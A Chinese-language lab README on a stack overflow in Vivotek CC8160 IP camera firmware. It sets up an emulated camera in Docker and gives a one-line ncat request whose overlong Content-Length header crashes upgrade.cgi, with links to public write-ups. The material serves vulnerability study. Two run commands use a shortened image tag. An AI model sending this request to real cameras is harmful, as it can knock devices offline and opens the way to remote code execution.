# Vivotek IP Cameras CC8160 栈溢出漏洞


## 漏洞环境

手动构建：

```sh
# 构建 binwalk 并解包固件
$ cd baseImage/binwalk
$ docker build -t binwalk .
$ cd Vivotek/remote_stack_overflow
$ docker run -v $PWD/firmware:/root/firmware binwalk -Mer /root/firmware/CC8160-VVTK-0100d.flash.zip

# 构建漏洞环境
$ docker build -t vivotek:cc8160 .

# 后台启动环境
$ docker run --privileged -p 1234:80 -dit vivotek:cc816
```

自动构建：

```sh
# 拉取 binwalk 并解包固件
$ docker pull firmianay/binwalk
$ docker run -v $PWD/firmware:/root/firmware firmianay/binwalk -Mer /root/firmware/CC8160-VVTK-0100d.flash.zip

# 拉取漏洞环境并启动
$ docker pull firmianay/vivotek:cc8160
$ docker run --privileged -p 1234:80 -dit vivotek:cc816
```

## 漏洞复现

```sh
echo -en "POST /cgi-bin/admin/upgrade.cgi\r\nHTTP/1.0\nContent-Length:AAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIXXXX\n\r\n\r\n"  | ncat -v 127.0.0.1 1234
```

![img](./crash.png)

## 参考链接

- https://www.exploit-db.com/exploits/44001
- https://xz.aliyun.com/t/5054
- https://www.anquanke.com/post/id/185336
- https://paper.seebug.org/480/
